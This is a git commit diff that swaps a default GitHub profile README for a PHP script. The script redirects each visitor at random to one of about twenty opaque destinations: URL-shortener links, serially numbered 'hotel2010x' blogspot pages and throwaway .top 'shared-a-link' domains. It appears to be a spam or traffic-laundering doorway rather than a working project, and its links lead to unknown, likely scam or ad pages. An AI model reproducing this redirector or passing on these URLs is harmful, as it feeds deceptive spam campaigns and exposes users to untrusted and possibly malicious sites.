f43c79652b1035a655f035a3a39135e4f908c938
sheko20000 <92609081+sheko20000@users.noreply.github.com>
2021-10-29 19:57:01 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,16 +1,28 @@
-### Hi there 👋
+<?php
 
-<!--
-**sheko20000/sheko20000** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+$urls = [];
+$urls[] = 'https://piar.me/jn8C5';
+$urls[] = 'http://piar.peek.link/26Hh';
+$urls[] = 'https://piar.me/8GVPP';
+$urls[] = 'http://piar.peek.link/26Hi';
+$urls[] = 'https://piar.me/2WAqe';
+$urls[] = 'http://piar.peek.link/26Hj';
+$urls[] = 'http://t.peek.link/26Cg';
+$urls[] = 'https://fanlink.to/fDfW';
+$urls[] = 'http://piar.peek.link/26CM';
+$urls[] = 'https://is.gd/i3KHfK';
+$urls[] = 'http://hotel20101.blogspot.com';
+$urls[] = 'http://hotel20102.blogspot.com';
+$urls[] = 'http://hotel20103.blogspot.com';
+$urls[] = 'http://hotel20104.blogspot.com';
+$urls[] = 'http://hotel20105.blogspot.com';
+$urls[] = 'http://hotel20106.blogspot.com';
+$urls[] = 'http://hotel20107.blogspot.com';
+$urls[] = 'http://hotel20108.blogspot.com';
+$urls[] = 'http://t.shared-a-link.top/yg5ln9';
+$urls[] = 'https://fanlink.to/fDfD';
+$urls[] = 'https://fanlink.to/fDfp';
+$urls[] = 'http://t.just-shared-this.top/ktfydq';
 
-Here are some ideas to get you started:
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+header('Location: ' . $urls[rand(0, count($urls) - 1)]);
